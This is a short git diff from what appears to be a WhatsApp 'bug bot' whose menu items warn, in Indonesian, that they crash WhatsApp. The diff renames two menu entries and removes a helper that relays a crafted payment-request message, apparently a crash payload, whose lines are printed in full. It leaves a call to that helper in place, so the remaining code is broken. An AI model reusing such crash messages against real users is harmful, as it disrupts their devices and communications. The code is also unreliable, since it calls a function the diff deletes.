@@ -368,12 +368,12 @@ if (!subscribe) {
 									{
 										"title": "DAHLAH",
 										"description": "WA CRASH JANGAN SALAHIN BOT ATAU YANG BUAT",
-										"rowId": `${prefix}xen`
+										"rowId": `${prefix}menu`
 									},
 									{
 										"title": "Jangan di pencet🗿",
 										"description": "WA CRASH JANGAN SALAHIN BOT ATAU YANG BUAT",
-										"rowId": `${prefix}ownerxen`
+										"rowId": `${prefix}owner`
 									}
 								]
 							}
@@ -604,9 +604,7 @@ break
        case 'ownerxen': case 'developerxen': case 'xen':
           
 don = fs.readFileSync('./BotMedia/sewa.jpg')
-const replay = (teks) => {
-  XeonBotInc.relayMessage(m.chat, { requestPaymentMessage: { Message: { TextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
-}
+
       replay(`Powered By xinn bug Bot Inc`)
          break
 
